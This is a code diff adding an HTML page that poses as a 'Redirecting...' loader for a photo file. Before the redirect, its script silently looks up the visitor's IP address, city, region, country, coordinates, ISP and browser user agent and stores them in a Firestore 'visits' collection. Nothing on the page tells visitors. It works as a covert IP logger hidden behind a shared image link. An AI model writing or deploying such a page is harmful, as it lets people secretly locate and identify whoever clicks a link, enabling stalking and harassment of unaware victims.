@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Redirecting...</title>
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.9.0/firebase-app.js";
+    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.9.0/firebase-firestore.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyD2bNyLFIJUAQxNvyBxG4IVh9vN3nrSg_M",
+      authDomain: "images-bfa2c.firebaseapp.com",
+      projectId: "images-bfa2c",
+      storageBucket: "images-bfa2c.firebasestorage.app",
+      messagingSenderId: "480825008444",
+      appId: "1:480825008444:web:36fe42f9f447773188be39"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const file = urlParams.get("file");
+
+    fetch("https://ipwhois.app/json/")
+      .then(res => res.json())
+      .then(async data => {
+        const logData = {
+            ip: data.ip || "Unknown",
+            city: data.city || "Unknown",
+            region: data.region || "Unknown",
+            country: data.country || "Unknown",
+            latitude: data.latitude || "Unknown",
+            longitude: data.longitude || "Unknown",
+            isp: data.org || "Unknown",
+            userAgent: navigator.userAgent,
+            timestamp: new Date().toISOString()
+        };
+
+        try {
+          await addDoc(collection(db, "visits"), logData);
+        } catch (e) {
+          console.error("Firestore error:", e);
+        }
+
+        if (file) {
+          window.location.href = `nuotraukos/${encodeURIComponent(file)}`;
+        } else {
+          document.body.innerText = "No file provided.";
+        }
+      })
+      .catch(err => {
+        console.error("IP fetch error:", err);
+      });
+  </script>
+</head>
+<body>
+  <p>Įkeliama</p>
+</body>
+</html>
